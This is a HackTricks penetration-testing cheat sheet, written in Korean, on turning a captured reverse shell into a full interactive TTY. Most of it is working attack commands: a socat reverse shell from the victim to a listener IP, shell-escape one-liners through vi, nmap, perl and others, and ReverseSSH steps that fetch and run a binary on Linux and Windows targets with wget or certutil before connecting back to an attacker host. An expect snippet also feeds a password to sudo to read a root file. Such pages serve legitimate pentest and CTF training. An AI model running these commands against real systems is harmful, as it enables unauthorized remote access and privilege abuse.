# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`SHELL` 변수에 설정한 셸은 **반드시** _**/etc/shells**_에 **목록에 있어야** 하며, 그렇지 않으면 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`라는 메시지가 표시됩니다. 또한, 다음 스니펫은 bash에서만 작동합니다. zsh에 있는 경우, `bash`를 실행하여 bash로 변경한 후 셸을 얻으십시오.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> **`stty -a`**를 실행하여 **행**과 **열**의 **수**를 확인할 수 있습니다.

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **쉘 생성**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**대화형 쉘 접근** 및 **파일 전송**과 **포트 포워딩**을 위한 편리한 방법은 정적으로 연결된 ssh 서버 [ReverseSSH](https://github.com/Fahrj/reverse-ssh)를 타겟에 배포하는 것입니다.

아래는 upx로 압축된 바이너리를 사용하는 `x86`의 예입니다. 다른 바이너리에 대해서는 [릴리스 페이지](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.

1. ssh 포트 포워딩 요청을 수신하기 위해 로컬에서 준비합니다:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) 리눅스 타겟:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 타겟 (이전 버전은 [프로젝트 README](https://github.com/Fahrj/reverse-ssh#features)를 확인하세요):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- ReverseSSH 포트 포워딩 요청이 성공했다면, 이제 `reverse-ssh(.exe)`를 실행하는 사용자의 컨텍스트에서 기본 비밀번호 `letmeinbrudipls`로 로그인할 수 있어야 합니다:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope)는 리눅스 리버스 셸을 자동으로 TTY로 업그레이드하고, 터미널 크기를 처리하며, 모든 것을 기록하고 그 외에도 많은 기능을 제공합니다. 또한 Windows 셸에 대한 readline 지원을 제공합니다.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

어떤 이유로 전체 TTY를 얻을 수 없는 경우에도 **여전히 사용자 입력을 기대하는 프로그램과 상호작용할 수 있습니다**. 다음 예제에서는 비밀번호가 `sudo`에 전달되어 파일을 읽습니다:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
